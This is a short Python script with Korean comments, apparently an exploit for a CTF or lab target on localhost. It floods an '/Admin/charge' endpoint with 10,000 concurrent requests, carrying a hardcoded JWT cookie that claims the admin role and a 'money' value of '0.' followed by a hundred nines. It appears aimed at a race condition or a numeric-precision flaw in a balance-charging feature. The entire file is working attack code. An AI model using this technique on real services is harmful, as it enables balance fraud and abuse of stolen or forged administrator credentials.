import asyncio
import aiohttp

# 요청을 보낼 URL
URL = "http://localhost:8000/Admin/charge"

# ID 고정값

cookie = {
    "jwt": "eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJyb2xlIjogImFkbWluIiwgImlhdCI6IDE3NDc5Mjc4MjV9._FaDd8rgh9fOC7E69Hxx3mN0aBVXGLj_9cFsJVbvCcU"
}
param={
    'money':"0."+"9"*100
}
# 요청을 보내는 비동기 함수
async def send_post_request(session, idx):

    try:
        async with session.get(URL, params=param,cookies=cookie) as response:
            text = await response.text()
            print(f"Request {idx}: Response: {response.status}, {text}")
    except Exception as e:
        print(f"Request {idx}: Error: {e}")

# 메인 비동기 함수
async def main():
    request_count = 10000  # 보낼 요청의 총 개수
    concurrency_limit = 1000  # 동시에 실행할 최대 요청 수

    # 비동기 세마포어 설정 (동시 실행 제한)
    semaphore = asyncio.Semaphore(concurrency_limit)

    async with aiohttp.ClientSession() as session:
        tasks = []
        for idx in range(request_count):
            # 세마포어를 활용해 동시 요청 수 제한
            async with semaphore:
                tasks.append(send_post_request(session, idx))
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
